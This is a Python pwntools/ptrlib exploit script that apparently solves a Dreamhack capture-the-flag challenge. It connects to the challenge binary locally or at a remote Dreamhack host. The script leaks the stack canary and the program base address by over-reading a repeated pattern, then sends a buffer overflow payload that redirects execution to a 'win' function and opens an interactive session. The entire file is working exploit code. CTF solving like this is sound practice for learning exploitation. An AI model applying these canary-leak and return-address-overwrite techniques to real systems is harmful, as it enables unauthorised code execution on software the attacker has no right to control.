#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./main")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 15574)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter("Pattern: ", "A" * 77)
    io.sendlineafter("Target length: ", "1000")
    io.recvuntil("A" * 1001)
    canary = ptr.u64(b"\0" + io.recv(7))
    ptr.logger.info(f"canary: {hex(canary)}")

    io.sendlineafter("Pattern: ", "A" * 43)
    io.sendlineafter("Target length: ", "1000")
    io.recvuntil("A" * 1032)
    exe.base = ptr.u64(io.recv(6)) - unwrap(exe.symbol("main"))

    payload = b""
    payload += b"A" * 3
    payload += b"A" * 8
    payload += ptr.p64(canary)
    payload += b"A" * 8
    payload += ptr.p64(next(exe.gadget("ret;")))
    payload += ptr.p64(unwrap(exe.symbol("win")))
    payload = payload.ljust(43, b"A")

    io.sendlineafter("Pattern: ", payload)
    io.sendlineafter("Target length: ", "1000")

    io.sendlineafter("Pattern: ", "A")
    io.sendlineafter("Target length: ", "1001")

    io.interactive()
    return


if __name__ == "__main__":
    main()
